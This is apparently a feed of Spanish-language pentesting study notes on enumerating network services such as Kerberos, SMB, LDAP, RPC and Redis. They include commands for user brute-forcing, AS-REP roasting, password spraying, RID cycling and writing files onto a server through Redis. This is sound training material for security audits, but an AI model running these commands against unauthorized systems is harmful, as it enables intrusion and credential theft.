Copy<br>Pero además de la herramienta dig tenemos una herramienta llamada dnsenum la también nos podría ayudar para enumerar subdominios existentes e información adicional. <br>dnsenum --dnsserver {target_ip} --threads 50 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt {domain}
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-dns-53-(domain-name-system).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/TCP/Enum. DNS 53 - (Domain Name System).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 08 Aug 2024 16:20:23 GMT</pubDate></item><item><title><![CDATA[Enum. GlusterFS]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:enumeration" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#enumeration</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:enumeration" class="tag" target="_blank" rel="noopener nofollow">#enumeration</a> 
<br><br><br>GlusterFS es un sistema multiescalable de archivos. Este permite agregar varios servidores de archivos sobre Ethernet o interconexiones infiniband en un gran entorno de archivos de red en paralelo. <br><br><br>Puede ser que de cara a una auditoria nos encontremos con un abierto corriendo GlusterFS, lo que puede ser una gran idea intentar enumerar este haciendo uso de herramientas como gluster-client <br>sudo apt search gluster
sudo apt install gluster-client gluster-server
Copy<br>Una vez instalado los paquetes, podríamos investigar el panel de ayuda para intentar listar posibles volumenes que existan en el target víctima. <br>gluster --remote-host={target_ip} volume list 

gluster --remote-host={target_ip} volume get {volume_name}|all all
Copy<br>De esta manera, una vez teniendo una lista potencial de los volumenes hayados en el host, podríamos intentar montarlos.<br>mount -t glusterfs {target_ip}:/{volume_name} /{our}/{path}
Copy<br>En caso de que surga algun error al intentar montar el volumen en alguna ruta de nuestro sistema, podríamos intentar ver los logs en /var/log/glusterfs/.<br>En caso de que todo salga bien, tendríamos el contenido del volumen en la ruta indicada de nuestro sistema, lo que nos puede ayudar a encontrar contenido sensible de cara a la auditoría, por lo que es muy imporatnte tener en cuenta enúmerar esto en caso de encontrarnoslo. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-glusterfs.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/TCP/Enum. GlusterFS.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 08 Aug 2024 16:12:17 GMT</pubDate></item><item><title><![CDATA[Enum. IMAP 143 - ( Internet Message Access Protocol )]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:recon" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#recon</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:recon" class="tag" target="_blank" rel="noopener nofollow">#recon</a> 
<br><br><br>El Internet Message Access Protocol (IMAP) nos permite acceder a nuestros correos electrónicos sin importar la ubicación, mayormente accediendo desde internet. Basicamente, correos electrónicos almanecdos en servidores. Por ejemplo, cuando vemos nuestro inbox, nuestro cliente de correo electrónico contacta con el servidor para conectarnos con nuestros mensajes. Cuando leemos un mensaje usando IMAP, no estamos descargando o almacenando este mensaje en nuestra computadora, en lugar de eso, estamos leyendolo desde el servidor. Como resultado, es posible verificar nuestros emails desde varios dispositivos diferentes.<br><br><br>Para proceder con la enumeración, puede ser de vital importancia tener en mente los comandos más comunmente usados en IMAP:<br>Login
	A1 LOGIN username password
Values can be quoted to enclose spaces and special characters. A \" must then be escape with a \
	A1 LOGIN "username" "password"

List Folders/Mailboxes
	A1 LIST "" *
	A1 LIST INBOX *
	A1 LIST "Archive" *

Create new Folder/Mailbox
	A1 CREATE INBOX.Archive.2012
	A1 CREATE "To Read"

Delete Folder/Mailbox
	A1 DELETE INBOX.Archive.2012
	A1 DELETE "To Read"

Rename Folder/Mailbox
	A1 RENAME "INBOX.One" "INBOX.Two"

List Subscribed Mailboxes
	A1 LSUB "" *

Status of Mailbox (There are more flags than the ones listed)
	A1 STATUS INBOX (MESSAGES UNSEEN RECENT)

Select a mailbox
	A1 SELECT INBOX

List messages
	A1 FETCH 1:* (FLAGS)
	A1 UID FETCH 1:* (FLAGS)

Retrieve Message Content
	A1 FETCH 2 body[text]
	A1 FETCH 2 all
	A1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])

Close Mailbox
	A1 CLOSE

Logout
	A1 LOGOUT
Copy<br>Podemos hacer uso de gestores de correo electrónico como Evolution, Claws-mail, entre otros, para conectarnos con una interfaz gráfica a IMAP y hacer lectura de los mails alojados en el servidor de correo.<br>apt install evolution
apt install claws-mail
Copy<br>Una vez instalado los paquetes de estos gestores, podríamos analizar su uso en internet para desplegar estas herramientas y conectarnos al servidor.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-imap-143-(-internet-message-access-protocol-).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/TCP/Enum. IMAP 143 - ( Internet Message Access Protocol ).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:44 GMT</pubDate></item><item><title><![CDATA[Enum. Kerberos 88]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:recon" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#recon</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:recon" class="tag" target="_blank" rel="noopener nofollow">#recon</a> 
<br><br><br>Kerberos es un protocolo de autenticación de redes de ordenador creado por el MIT que permite a dos ordenadores en una red insegura demostrar su identidad mutuamente de manera segura. <br>Para terminar de entender como funcional el flujo de autenticación de kerberos, ver: <a data-href="KERBEROS_AUTHETICATION_FLOW" href="https://dobliuw.com/notes/5.-technologies/services/kerberos/kerberos_authetication_flow.html" class="internal-link" target="_self" rel="noopener nofollow">KERBEROS_AUTHETICATION_FLOW</a><br><br><br>Kerberos suele ser una gran fuente de interes de cara a una auditoría desde el reconocimeitno que se puede aplicar hasta ataques a los que se puede deribar. <br>Herramientas como <a data-tooltip-position="top" aria-label="https://github.com/ropnop/kerbrute" rel="noopener nofollow" class="external-link" href="https://github.com/ropnop/kerbrute" target="_blank">kerbrute</a> nos puede ser de gran ayuda de cara a la enumeración así como de cara a posibles ataques de fuerza bruta a realizar. (Diccionario recomendable a usar en ataques de fuerza bruta: seclists/Usernames/xato-net-10-million-usernames.txt )<br>Una vez que dispongamos de un diccionario (Propio o no) de usuarios, podríamos haciendo uso de kerbrute realizar fuerza burta:<br>kerbrute userenum --dc {target_ip} -d {domain_name} {users.txt}
# Fuerza bruta al dominio de nuestra maquina victima intentando enumerar usuarios validos del dominio en base a una wordlists de usuarios
impacket-GetNPUsers {domain_name}/ -no-pass -usersfile {users.txt}
# Esta herramienta tambien podria ser usado para fuerza bruta ya que devolveria en caso de conseguir un usuario existente un output diferente.
# Si el usuario no exsite [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database), si el usuario existe [-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
Copy<br>Una vez que tuvieramos usuarios tambien podriamos pensar en un <a data-href="AS-REP Roast Attack" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/1.-windows/kerberos-vulns/as-rep-roast-attack.html" class="internal-link" target="_self" rel="noopener nofollow">AS-REP Roast Attack</a> pero como kerbrute ya lo hace de manera interna, si no vemos en el output un hash quiere decir que el usuario no tiene configurado el UF_DONT_REQUIRE_PREAUTH, por lo que no podemos obtener el hash NetNTLMv2.<br>En caso de tener un hash, podriamos usar la herramienta "hashcat" para intentar romper el hash, para esto es importante saber el modo del hash al que nos enfrentamos, por ejemplo, si el hash que capturaramos fuese $krb5asrep$23$user@domain.com:378sh129fsdf8sdf7...  podriamos buscar con el comando hashcat --example-hashes y filtradon por el "krb5asrep" (hashcat --example-hashes | grep -B 11 "krb5asrep") para poder conseguir asi el modo que sera utilizado posteriormente con la herramienta "hashcat"<br><br>Para obtener el hash mode, hashcat --example-hashes <br>En caso de lograr crackear el hash NetNTLMv2, indicaria que podriamos tener credenciales validas, esto lo podemos corroborar con la herramienta "crackmapexec": <br><br>De esta manera, en caso de obtener un "[+]" indicaria de que las mismas son validas, aunque para poder obtener una shell interactiva buscamos que al usuario le aparezca un "Pwn3d!" para poder usar psexec y intentar ganar acceso al sistema, en caso de que no, podriamos en caso de tener el puerto 5985 ( SSDP / UPnP) (Servicio de administración remota de windows)<br>
De manera que podriamos verificar si el usuario en cuestion pertenece al grupo "Remote Managment Users" los cuales pueden conectarse de manera remota:<br><br>En caso de obtener el glorioso "Pwn3d!", podriamos con herramientas como "evil-winrm",  entablar una consola remota.<br>]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-kerberos-88.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/TCP/Enum. Kerberos 88.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 17 Sep 2024 19:17:11 GMT</pubDate></item><item><title><![CDATA[Lighweight Directory Access Protocol]]></title><description><![CDATA[ 
 <br><br>El protocolo LDAP o protocolo ligero de acceso a directorios es un protocolo a nivel de aplicación que permite el acceso a un servicio de directorio ordenado y distrubido para buscar diversa información en un entorno de red. <br><br><br>De cara a una auditoria de seguridad es muy importate la enumeración, y el protocolo LDAP puede ser una muy buena fuente de información, en caso de que podamos enumerarlo. <br><br>ldapsearch -H "ldap://{target_ip}" -x -s base namingcontexts
# Enumerar servicio ldap, en este caso, namingcontexts
ldapsearch -H "ldap://{target_ip}" -x -b {naming_context}
# Enumerar el servicio ldap
ldapsearch -H ldap://{target_ip}/ -x -D 'user@domain' -w 'password' -b "DC=subdomain,DC=tld"
# Corroborar credenciales validas
ldapsearch -H ldaps://{target_ip}/ -x -s base -b '' "(objectClass=*)" "*" +  
# Anonymous access
Copy<br><br>nmap -n -sV --script "ldap* and not brute" -p 389 {target_ip}
Copy<br><br>cd /var/www/html 
ldapdomaindump -u '{domain}\{username}' -p '{password}' {target_ip}
sudo systemctl start apache2 
Copy<br>De esta manera, estamos volcando toda la información recopilada por la herramienta dentro de /var/www/html y al levantar el servicio de apache, si nos dirigimos al localhost tendremós  información en formato HTML.<br>Adicionalmente, podemos encontrar más información sobre la enumeración del protoclo de LDAP en paǵinas como <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap" rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap" target="_blank">hacktricks</a>]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-ldap-389-&amp;-636-(-lighweight-directory-access-protocol-).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/TCP/Enum. LDAP 389 &amp; 636 - ( Lighweight Directory Access Protocol ).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 08 Aug 2024 16:04:30 GMT</pubDate></item><item><title><![CDATA[Microsoft DS (Directory Services)]]></title><description><![CDATA[ 
 <br><br>Microsfot DS (Microsoft Directory Services) es un protocolo utilizado para compartir archivos a través de la red y otros serivcios proporcionados por Microsoft, principalmente a través del protocolo SMB mediante 445/tcp. <br>Microsoft-DS permite SMB para funcionar directamente a través de TCP/IP sin la necesidad de NetBIOS (<a data-href="Enum. NetBIOS 137" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/udp/enum.-netbios-137.html" class="internal-link" target="_self" rel="noopener nofollow">Enum. NetBIOS 137</a>). Elimina la necesidad de la capa de NetBIOS, simplificando la comunicación y brindando eficiencia.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-microsoft-ds-445.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/TCP/Enum. Microsoft-DS 445.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 08 Aug 2024 16:16:10 GMT</pubDate></item><item><title><![CDATA[Enum. POP3 110 & 995 - ( Post Office Protocol )]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:recon" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#recon</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:recon" class="tag" target="_blank" rel="noopener nofollow">#recon</a> 
<br><br><br>El Post Office Protocol, Protocolo de oficina de correo en español (POP) es un tipo de red de computadoras y protocolo estandar de internet que extrae y recupera correos electronicos desde un servidor remoto de mails para una máquina host. Es un protocolo de capa de aplicación que permite a los usuarios finales la capacidad de buscar y recibir correos electrónicos. <br><br><br>Para proceder con la enumeración, puede ser de vital importancia tener en mente los comandos más comunmente usados en POP:<br>USER uid Log in as "uid"
PASS password Substitue "password" for your actual password
STAT List number of messages, total mailbox size
LIST List messages and sizes
RETR n Show message n
DELE n Mark message n for deletion
RSET Undo any changes
QUIT Logout (expunges messages if no RSET)
TOP msg n Show first n lines of message number msg
CAPA Get capabilities
Copy<br>Los puertos por defecto en los que suele correr este protocolo es el puerto 110 y el puerto 995 (ssl).<br><br>Podemos inspeccionar el certificado ssl (En caso de que este este disponible en el puerto 995) haciendo uso de herramientas como openssl.<br>openssl s_client -connect {target_ip}:995 
Copy<br><br>Teniendo en cuenta los comandos anteriormente mencionados, vimos que existe el comando CAPA el cual nos permite extraer y obtener las capabilities, lo cual puede resultar en información sensible. Para hacer uso de esto podemos lanzar un script de nmap encargado de intentar abusar de esto.<br>nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p110 {target_ip}
Copy<br><br>También podemos hacer uso de herramientas como NetCat o Telnet para conectarnos de manera manual e intentar realizar diversas operaciones, desde inicio de sesion en caso de contar con credenciales, etc.<br>telnet {target_ip} 110
+OK beta POP3........
USER {username}
+OK
PASS {password}
+OK Welcome {username}

list

+OK 2 1807
1 786
2 1021

retr 1

+OK Message follows
From: ..............
Copy<br>De esta manera podríamos recuperar los correos alojados e inspeccionar manualmente cada uno de estos con el comando LIST para listar estos y el comando RETR n para recuperar y listar el contenido de determinado correo.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-pop3-110-&amp;-995-(-post-office-protocol-).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/TCP/Enum. POP3 110 &amp; 995 - ( Post Office Protocol ).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:44 GMT</pubDate></item><item><title><![CDATA[Enum. Redis 6379]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> 
<br><br><br>Redis es un motor de base de datos en memoria, basado en el almacenamiento en trablas de hashes pero que opcionalmente puede ser usada com una base de datos durable o persistente.<br>Es importante tener en cuenta que redis es una base de datos NoSQL que almacena datos en uan estructura de clave-valor. La clave (key) es un identificador único que se utiliza para acceder a los datos y el valro es cualqueir tipo de dato, como cadenas, listas, conjuntos, hash maps, etc.<br><br><br>Redis puede escanearse de manera manula o automatizada...<br>
<br>

`
<br>nmap --script redis-info -sV -p 6379 {ip}
Copy<br>
<br>


<br>Para conectarnos a redis podemos hacer uso de nc o redis-cli. <br>nc -vn {ip} 6379

redis-cli -h {ip} # sudo apt-get install redis-tools
Copy<br>Comandos basicos para enumerar: <br>INFO 
# [...Listar información en general así como de las base de datos en memoria...]
clien list 
# [...Listar los usuarios conectados...]
CONFIG GET * 
# [...Obtener las configuraciones...]
Copy<br>En caso de haber base de datos, podríamos intentar listar estas. <br>SELECT {number}
# [...Seleccionar una base de datos...]
KEYS *
# [...Obtener las keys de la bade de datos...]
GET {name_of_key}
# [...Seleccionar el valor de las keys...]
Copy<br><br><br>Muchas veces una web la cual acepta php esta vinculada con redis, de maner que se nos podría ocurrir intentar depostiar un archivo especifico en una ruta en particular. <br>Es IMPORTANTE tener en cuenta que todo archvo que subamos debe empezar con 3 saltos de linea ("\n\n\n") y finalizar con 2 ("\n\n"). <br>cat {file_to_upload} | redis-cli -h {ip} -x set {identifier_name}

redis-cli -h {ip} config set {path_to_upload_the_file}

redis-cli -h {ip} config set dbfilename "{filename}"

redis-cli -h {ip} save

Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-redis-6379.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/TCP/Enum. Redis 6379.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:44 GMT</pubDate></item><item><title><![CDATA[Remote Procedure Call]]></title><description><![CDATA[ 
 <br><br>El protocolo RPC (Remote Procedure Call o llamada a procedimiento remoto) es un protocolo que permite a un programa solicitar un servicio a un programa ubicado en otro equipo dentro de una red. (Puerto 135)<br>Por otro lado, los RID (Relative Identifier) son una parte de los SID (Security Identifier) que identifica de manera única a una cuenta o grupo dentro de un dominio o equio local. <br><br><br>La enumeración del protcolo RPC puede ser fundamental en una auditoria para enumerar usuarios, grupos, etc.<br>Para esto podemos hacaer uso de herramientas como rpcclient. <br><br>rpcclient -U "" {target_ip} -N
# Intentar obtener una consola haciendo uso de una NULL session para poder enumerar usuarios, grupos, etc. 
rpcclient -U "{username}%{password}" {target_ip} -N
# Intentar obtener una consola haciendo uso de credenciales para poder enumerar usuarios, grupos, etc. 
Copy<br><br>enumdomusers 
# Listar los usuarios junto a sus rid
enumdomgroups
# Listar los grupos junto a su rid
querygroupmem {rid} 
# Listar los usuarios pertenecientes a un grupo 
queryuser {rid}
# Listar datos del usuario ingresado
querydispinfo
# Listar descripciones de los grupos 
Copy<br> También podríamos intentar brute forcear estos valores mediante herramientas como crackmapexec:<br>crackmapexec smb {domain} -u anonymous -p "" --rid-brute 10000
Copy<br><br><br>Adiconalmente, la técnica RID Cycling es un método utilizado para enumerar cuentas de usuario en un sistema Windows. Este ataque explota el hecho de que se puedan cosnultar los SIDs (Securit Identifiers) de manera incremental mediante solictudes RPC, incluso si las políticas de acceso de la red son restrictivas.<br>Para llevar a cabo el ataque RID Cycling, podemos hacer uso de herramientas como rpcclient de Samba o crackmapexec.<br>rpcclient -U 'guest%' {target_IP} -c 'lookupnames administrator'
Copy<br>Una vez ejecutado el comando indicado, veremos en el stdout el SID, por ejemplo:<br>administrator S-1-5-21-4078382237-1492182817-2568127209-500 (User: 1)
Copy<br>Donde el SID sería administrator S-1-5-21-4078382237-1492182817-2568127209- y el RID el número final 500. Entendiendo esta composición, podremos hacer uso del SID e iterar por diversos valores en la posición del RID:<br>seq 400 2000 | xargs -P 200 -I {} rpcclient -U 'guest%' {target_IP} -c 'lookupsids S-1-5-21-4078382237-1492182817-2568127209-{}' | grep -v unknown
Copy<br>De esta manera, lograríamos obtener un listado de usuarios válidos en el dominio de Active Directory o en el equipo local del workstation.<br><br><br>Para evitar este tipo de ataques, se recomienda restringir el acceso a RPC a través de firewalls y políticas de acceso, así como monitorear el tráfico de red.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-rpc-135-(-remote-procedure-call-).html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Protocolos/TCP/Enum. RPC 135 - ( Remote Procedure Call ).md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 08 Aug 2024 16:04:46 GMT</pubDate></item><item><title><![CDATA[Server Message Block]]></title><description><![CDATA[ 
 <br><br>El protocolo SMB (Server Message Block) es un protocolo de red que permite compartir archivos, impresoras, etc. entre nodos de una red de computadoras que usan el sistema operativo Microsoft Windows. <br><br><br>
<br>NetBIOS: Como podemos ver en <a data-href="Enum. NetBIOS 137" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/udp/enum.-netbios-137.html" class="internal-link" target="_self" rel="noopener nofollow">Enum. NetBIOS 137</a>, este es un protocolo antiguo de redes quer permite que aplicaciones en diferentes computadoras se comuniquen dentro de una red local.
<br>SMB: Protocolo de transferencia de archivos a través de red que permite a las aplicaciones leer y escribir en archivos y solicitar servicios de programas de servidor en una red.
<br>Microsoft-DS: Se refeiere a SMB ejecutandose directamente sobre TCP/IP sin necesidad de NetBIOS, normalmente utilizado sobre el puerto 445. Es una aprte integral de las redes de Windows para compartir archivos e impresoras, entre otros servicios.
<br><br><br>Como sabemos lo primordial de cara a una auditoria de seguridad es el proceso de reconocimiento, muchas veces nos enfrentaremos a sistemas los cuales tengan el puerto 445 expuesto corriento el protoclo SMB el cual nos puede ser una gran fuente de información en el mejor de los casos privilegiada. <br>Alguna de las herramientas más utilizadas para enumerar este protocolo son crackmapexec, smbmap y smbclient. <br>
<br>


<br><br>apt-get install -y libssl-dev libffi-dev python-dev-is-python3 build-essential
git clone https://github.com/mpgn/CrackMapExec
cd CrackMapExec
poetry install
poetry run crackmapexec
Copy<br><br>crackmapexec smb {target_ip}
# Intentar listar información de la máquina victima, como nombre de la máquina, dominios, version de windows, etc. 
crackmapexec smb {target_ip} --shares
# Intentar listar recursos compartidos a nivel de red. 
crackmapexec smb {target_ip} -u 'kjdshgfkashgkj' -p '' --shares
# Intentar listar recursos compartidos como invitado
Copy<br><br><br>crackmapexec smb {target_ip} -u '{username}' -p '{password}'
# Validar credenciales
crackmapexec smb {target_ip} -u '{username}' -H '{hash_NT}'
# Validar credencailes con el hash NT

crackmapexec winrm {target_ip} -u '{username}' -p/-H '{passowrd/hash_NT}'
# También se podrían validar dichas credenciales de cara a winrm 
# (Si el usuario pertenece al grupo REMOTE MANAGEMENTE USERS y las credenciales son válidas tendríamos acceso al sistema)
Copy<br><br>crackmapexec smb {domain} -u 'dgadg' -p '' --rid-brute
# Intentar conseguir una potencial lista de usuarios haciendo uso de la conexión como invitado
Copy<br>En este punto lo que estariamos intentando ejecutar de manera automática es el ataque <a data-href="Enum. RPC 135 - ( Remote Procedure Call )#RID Cycling attack" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/enum.-rpc-135-(-remote-procedure-call-).html#RID_Cycling_attack" class="internal-link" target="_self" rel="noopener nofollow">Enum. RPC 135 - ( Remote Procedure Call ) &gt; RID Cycling attack</a>. <br>Por otro lado, es importante tener en cuenta que adicinalmente, crackmapexec nos sirve para realizar ataques de fuerza bruta de usuarios, contraseñas, etc.<br><br>crackmapexec smb {target_ip} -u {users_dictionary.txt} -p "{password}" --continue-on-success
# Fuerza bruta para una lista de usuarios haciendo uso de una contraseña
crackmapexec smb {domain} -u {users_dictionary.txt} -p '' --continue-on-success
# Intentar loguearse sin contraseña con una potencial lista de usuarios
crackmapexec smb {domain} -u {users_dictionary.txt} -p {users_dictionary.txt} --no-bruteforce --continue-on-success
# Probar cada usuario de una lista con el mismo nombre de usuario como contraseña
Copy<br>
<br>


<br><br>smbmap -H {target_ip} -u "null"
# Intentar lilstar recursos compartidos a nivel de red haciendo uso de una NULL sesion (Para cuando no disponemos de credenciales)
smbmap -H {target_ip} -u '{username}' -p 'password'
# Listar recursos compartidos a nivel de red en caso de tener credenciales.

-r {$SHARE_NAME}
# Esta opción la podemos utilizar para listar un recurso compartido de manera recursiva.

--download {$SHARE_NAME/$FILE}
# Esta opción la podemos utilizar para descargar un recurso del recurso compartido a nivel de red. 
Copy<br>
<br>


<br><br>smblicent -L {target_ip} -N
# Intentar listar los recursos compartidos a nivel de red haciendo uso de una NULL session 
smbclient \\\\{target_ip}\\{shared_folder_name} -U '{username%password}'
# Conectarse a un recurso compartido a nivel de red haciendo uso de credenciales 
smbclient //{target_ip}/{shared_folder_name} -N 
# Listar un recurso compartido en particular disponiendo de una NULL session
smbclient 'asdfdafad@{computer_name}.{domain}' -no-pass
# Intentar conectarse como un usuario inexistente sin proporcionar contraseña
Copy<br><br>Es importante tener en cuenta que durante la enumeración, en caso de tener acceso a recursos compartidos a nivel de red, estos pueden ser muy dificiles de inspeccionar debido a que podrían contener mucha información, directorios, archvios, etc. En estos casos suele ser recomendable jugar con monturas para montar todo el contenido de uno de estos recursos compartidos a nivel de red para volcar el contenido en un path del sistema que querramos y así poder jugar con utilidades como tree las cuales nos permiten de una manera más visual y ordenada hacernos una idea de la distribución del cotenido. <br>sudo apt install cifs-utils
# Instalar las dependencias necesarias para poder utilizar esto.

mount -t cifs //{target_ip}/{$SHARE_FOLDER} {/our/path}
# Intentar montar el recurso compartido a nivel de red seleccionado en una ruta específica

mount -t cifs //{target_ip}/{$SHARE_FOLDER} {/out/path} username=null,password=null,domain=,rw
# Intentar montar el recurso compartido a nivel de red seleccionado en una ruta específica (Manera alternativa)

mount -t cifs //{target_ip}/{$SHARE_FOLDER} {/out/path} -o username='{username}',password='{password}',rw
# Montar el recurso compartido a nivel de red en una ruta especifica

umount {/our/path}
# Demonstar la montura 
Copy<br>Para listar los permisos de carpetas alojadas en un recurso compartido, podríamos hacer uso de herramientas como smbcacls. <br>smbcacls "//{taget_ip}/{share_folder}" {Path/to/File_or_Folder} -N 
# Intentarlistar los permisos de una carpeta o archivo haciendo uso de una NULL Sesion.
